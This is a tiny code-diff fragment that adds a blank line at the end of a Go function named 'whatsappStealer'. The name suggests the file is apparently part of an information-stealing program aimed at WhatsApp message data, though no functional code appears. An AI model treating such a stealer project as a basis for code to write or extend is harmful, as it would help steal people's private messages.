@@ -171,3 +171,4 @@ func whatsappStealer(folderMessaging string) {
 		}
 	}
 }
+
